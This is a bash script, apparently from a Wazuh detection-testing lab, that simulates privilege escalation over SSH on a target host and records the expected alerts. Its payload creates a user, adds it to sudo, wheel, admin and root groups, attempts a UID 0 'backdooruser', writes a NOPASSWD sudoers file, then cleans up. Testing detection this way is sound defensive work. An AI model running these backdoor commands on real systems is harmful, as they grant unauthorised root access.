#!/bin/bash
#===============================================================================
# Attack #08: User Added to Admin/Sudo Group
# Category: Privilege Escalation
# Expected Wazuh Rules: 5301 (lvl5), 5903 (lvl3)
# Expected Level: 3-5 (observed)
# MITRE ATT&CK: T1136.001 (Create Account: Local Account)
#===============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../scripts/config.env" 2>/dev/null || true

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACK_ID="08"
ATTACK_NAME="User Added to Admin Group"
ATTACK_CATEGORY="Privilege Escalation"

TARGET="${1:-$TARGET_IP}"

echo "==============================================================================="
echo -e "${YELLOW}ATTACK #${ATTACK_ID}: ${ATTACK_NAME}${NC}"
echo "==============================================================================="
echo "Target: $TARGET"
echo "Category: $ATTACK_CATEGORY"
echo ""

START_TIME=$(date +%s.%N)
START_TIMESTAMP=$(date -Iseconds)

echo -e "${GREEN}[*] Attack started at: $START_TIMESTAMP${NC}"
echo ""

ATTACK_COMMANDS='
#!/bin/bash
echo "[*] User privilege escalation attack..."

TEST_USER="testattacker"

# 1. Create a new user
echo "[*] Creating test user: $TEST_USER"
sudo useradd -m -s /bin/bash "$TEST_USER" 2>/dev/null || echo "    User may already exist"

# 2. Add user to sudo group
echo "[*] Adding user to sudo group..."
sudo usermod -aG sudo "$TEST_USER" 2>/dev/null || \
sudo usermod -aG wheel "$TEST_USER" 2>/dev/null || \
echo "    Could not add to sudo/wheel group"

# 3. Add user to admin group
echo "[*] Adding user to admin group..."
sudo usermod -aG admin "$TEST_USER" 2>/dev/null || echo "    admin group may not exist"

# 4. Add user to root group (dangerous in real scenario)
echo "[*] Adding user to root group..."
sudo usermod -aG root "$TEST_USER" 2>/dev/null || echo "    Could not add to root group"

# 5. Create user with specific UID (UID 0 = root)
echo "[*] Attempting to create user with low UID..."
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash "backdooruser" 2>/dev/null || \
echo "    Could not create UID 0 user (expected)"

# 6. Modify /etc/passwd to add root-level user (simulation)
echo "[*] Simulating /etc/passwd modification..."
echo "# Simulated backdoor entry" | sudo tee -a /tmp/passwd_simulation > /dev/null
echo "backdoor:x:0:0:root:/root:/bin/bash" | sudo tee -a /tmp/passwd_simulation > /dev/null

# 7. Add sudoers entry directly
echo "[*] Creating sudoers entry..."
echo "$TEST_USER ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/test_backdoor > /dev/null 2>&1

# 8. Verify changes
echo ""
echo "[*] Verifying user privileges..."
id "$TEST_USER" 2>/dev/null
groups "$TEST_USER" 2>/dev/null
sudo -l -U "$TEST_USER" 2>/dev/null | head -5

echo ""
echo "[*] Waiting for detection..."
sleep 10

# Cleanup
echo "[*] Cleaning up..."
sudo userdel -r "$TEST_USER" 2>/dev/null
sudo userdel -r "backdooruser" 2>/dev/null
sudo rm -f /etc/sudoers.d/test_backdoor 2>/dev/null
sudo rm -f /tmp/passwd_simulation

echo "[*] Cleanup complete"
'

echo "[*] Commands to run on target agent:"
echo ""
echo "$ATTACK_COMMANDS"


TARGET="${1:-$TARGET_IP}"
SSH_KEY_RAW="${SSH_KEY_OVERRIDE:-${TARGET_SSH_KEY:-$HOME/.ssh/wazuh-agent.pem}}"
SSH_USER="${3:-${TARGET_USER:-ubuntu}}"
SSH_KEY="${SSH_KEY_RAW/#\~/$HOME}"



if [ -n "$SSH_KEY" ] && [ -f "$SSH_KEY" ]; then
    echo "[*] Running attack via SSH using key $SSH_KEY ..."
    ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$SSH_USER@$TARGET" "$ATTACK_COMMANDS"
else
    echo -e "${YELLOW}[!] Cannot connect to target. Printing commands to run manually:${NC}"
    echo ""
    echo "--- Run these commands on the target agent ---"
    echo "$ATTACK_COMMANDS"
    echo "--- End of commands ---"
fi


END_TIME=$(date +%s.%N)
END_TIMESTAMP=$(date -Iseconds)
DURATION=$(echo "$END_TIME - $START_TIME" | bc)

echo ""
echo "==============================================================================="
echo -e "${GREEN}[✓] Attack script generated${NC}"
echo "==============================================================================="
echo "Start Time: $START_TIMESTAMP"
echo "End Time: $END_TIMESTAMP"
echo ""
echo "Expected Wazuh alerts:"
echo "  - Rule 5904: User added to privileged group"
echo "  - Rule 5905: New user added"
echo "  - Rule 5906: User account modification"
echo "  - Rule 5141: New account created"
echo "  - Sudoers modification alerts"
echo ""
echo "Data for CSV:"
echo "  attack_id: $ATTACK_ID"
echo "  attack_name: $ATTACK_NAME"
echo "  category: $ATTACK_CATEGORY"
echo "  attack_start_time: $START_TIMESTAMP"
echo "  attack_end_time: $END_TIMESTAMP"
